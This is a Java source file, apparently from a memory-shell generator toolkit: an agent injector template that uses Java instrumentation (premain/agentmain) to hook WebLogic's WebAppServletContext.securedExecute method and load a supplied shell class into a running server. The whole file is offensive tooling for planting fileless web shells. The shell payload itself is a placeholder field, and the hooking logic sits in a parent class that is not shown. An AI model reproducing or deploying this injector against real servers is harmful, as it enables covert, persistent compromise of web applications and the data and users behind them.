package org.leo.jmg.mem.injectortpl.weblogic;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** securedExecute Agent 挂载模板。 */
public class WebLogicServletContextAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "weblogic/servlet/internal/WebAppServletContext"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new WebLogicServletContextAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new WebLogicServletContextAgentInjector());
    }

    @Override
    protected String[] targetClasses() { return TARGET_CLASSES; }

    @Override
    protected String targetMethodName() { return "securedExecute"; }

    @Override
    protected String shellClassName() { return shellClassName; }

    @Override
    protected String shellClassPayload() { return shellClass; }
}
